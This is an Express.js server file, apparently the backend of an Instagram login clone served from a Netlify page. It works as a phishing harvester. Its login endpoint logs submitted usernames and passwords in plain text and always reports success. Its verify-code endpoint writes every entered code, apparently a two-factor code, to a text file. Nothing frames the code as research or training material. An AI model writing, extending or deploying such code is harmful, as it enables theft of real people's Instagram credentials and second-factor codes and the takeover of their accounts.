const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); 
const fs = require('fs'); 

const app = express();
const PORT = process.env.PORT || 3000; 

// CORS Options
const corsOptions = {
    origin: 'https://lexantly-insta-gram-4c38b8.netlify.app', // Your Netlify frontend URL
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type'],
    credentials: true // Include credentials for cookies and headers
};

// Middleware
app.use(bodyParser.json());
app.use(cors(corsOptions)); 

// Define a route for the root URL
app.get('/', (req, res) => {
    res.send('Welcome to the Instagram Login Clone Backend!');
});

// Endpoint to receive login data
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    console.log('Received login data:', { username, password });
    res.json({ success: true, message: 'Login successful' });
});

// Endpoint to verify the code
app.post('/api/verify-code', (req, res) => {
    const { code } = req.body;

    fs.appendFile('codes.txt', `Entered code: ${code}\n`, (err) => {
        if (err) {
            console.error('Failed to record the code:', err);
            return res.status(500).json({ success: false, message: 'Error recording code' });
        }
        console.log('Code recorded:', code);

        if (code === '123456') {
            res.json({ success: true, message: 'Code verified successfully' });
        } else {
            res.json({ success: false, message: 'Invalid code' });
        }
    });
});

// Start server and listen on all network interfaces
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://0.0.0.0:${PORT}`);
});
